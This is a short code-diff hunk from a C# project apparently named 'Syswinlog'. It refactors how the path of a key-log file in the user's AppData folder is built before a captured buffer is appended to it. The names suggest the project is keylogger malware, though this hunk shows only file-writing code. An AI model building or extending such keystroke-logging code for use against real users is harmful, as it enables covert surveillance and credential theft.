@@ -87,8 +87,7 @@ namespace Syswinlog
             }
              
             using (_outfile = new StreamWriter(
-                Environment.GetFolderPath(
-                    Environment.SpecialFolder.ApplicationData) + Constants.KeyLogPath, true, Encoding.Unicode) ) {
+                Utils.GetAppDataFolder() + Constants.KeyLogPath, true, Encoding.Unicode) ) {
                 _outfile.Write(_internal);
             }
         }
